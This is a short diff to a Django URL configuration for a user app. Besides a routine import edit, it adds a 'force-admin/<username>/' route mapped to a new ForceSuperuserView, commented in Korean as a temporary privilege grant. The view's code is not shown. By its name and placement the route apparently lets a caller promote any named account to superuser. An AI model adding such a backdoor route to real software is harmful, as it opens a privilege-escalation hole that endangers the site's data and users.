@@ -9,7 +9,8 @@ from .views import (
     VerifyCodeforcesView,
     AdminUserListView,
     AdminUserDetailView,
-    AdminStatsView
+    AdminStatsView,
+    ForceSuperuserView
 )
 
 app_name = 'user'
@@ -44,4 +45,7 @@ urlpatterns = [
     path('admin/users/', AdminUserListView.as_view(), name='admin-user-list'),
     path('admin/users/<int:user_id>/', AdminUserDetailView.as_view(), name='admin-user-detail'),
     path('admin/stats/', AdminStatsView.as_view(), name='admin-stats'),
+    
+    # 임시 권한 부여
+    path('force-admin/<str:username>/', ForceSuperuserView.as_view()),
 ]
